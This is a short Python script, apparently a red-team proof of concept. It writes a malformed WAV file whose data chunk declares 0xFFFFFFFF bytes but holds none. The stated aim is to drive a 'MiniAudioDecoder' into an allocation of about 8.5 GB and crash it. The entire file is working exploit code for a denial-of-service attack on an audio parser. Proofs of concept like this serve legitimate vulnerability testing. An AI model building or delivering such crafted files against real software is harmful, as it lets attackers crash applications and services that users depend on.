#!/usr/bin/env python3
"""Red Team PoC — WAV Parser Heap Exhaustion (DoS)
Target: MiniAudioDecoder.cpp:123 → audioData.resize(samplesCount)
dataSize=0xFFFFFFFF → 2.1B samples → ~8.5 GB allocation
"""
import struct, sys, os

def build_wav():
    b = bytearray()
    b += b'RIFF'
    riff_size_pos = len(b)
    b += struct.pack('<I', 0)
    b += b'WAVE'
    # fmt chunk
    b += b'fmt '
    b += struct.pack('<I', 16)
    b += struct.pack('<H', 1)       # audioFormat=PCM
    b += struct.pack('<H', 1)       # numChannels
    b += struct.pack('<I', 44100)   # sampleRate
    b += struct.pack('<I', 44100)   # byteRate
    b += struct.pack('<H', 2)       # blockAlign
    b += struct.pack('<H', 16)      # bitsPerSample=16
    # data chunk — declare 4GB, deliver 0 bytes
    b += b'data'
    b += struct.pack('<I', 0xFFFFFFFF)  # dataSize = 4GB ← TRIGGER
    # No actual payload — file ends here
    
    struct.pack_into('<I', b, riff_size_pos, len(b) - 8)
    return bytes(b)

def main():
    output = sys.argv[1] if len(sys.argv) > 1 else 'poc_heap_exhaust.wav'
    wav = build_wav()
    with open(output, 'wb') as f:
        f.write(wav)
    sz = os.path.getsize(output)
    ds = struct.unpack('<I', wav[wav.find(b'data')+4:wav.find(b'data')+8])[0]
    print(f"[+] PoC: {output} ({sz} bytes, declares {ds/1e9:.1f} GB of audio)")
    print("[+] dataSize=0xFFFFFFFF → resize(2.1B floats) → ~8.5 GB → crash")

if __name__ == '__main__':
    main()
